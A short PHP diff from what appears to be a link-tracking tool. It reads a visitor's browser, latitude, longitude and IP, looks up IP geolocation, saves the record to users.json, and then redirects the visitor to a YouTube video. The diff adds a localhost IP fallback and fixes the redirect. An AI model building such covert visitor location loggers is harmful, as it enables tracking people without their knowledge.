@@ -51,10 +51,12 @@ function getInfo()
     $browser = UserInfo::get_browser();
     $notes = '';
 
-
     $latitude = $_GET['lat'];
     $longtitude = $_GET['long'];
     $method = 'getcurrentposition';
+    if ($ip == "::1") {
+        $ip = "91.106.45.252";
+    };
 
 
     $details = json_decode(file_get_contents("https://api.ipregistry.co/${ip}?key=tryout"), true);
@@ -85,8 +87,8 @@ function createUser($id)
     $users = json_encode($users);
 
     file_put_contents('users.json', $users);
-    $link = 'https://www.youtube.com/watch?v=' + $id;
-    header("location:${link}");
+    $link = "Location: https://www.youtube.com/watch?v=${id}";
+    header($link, true, 301);
 }
 
 function updateUser($data, $date)
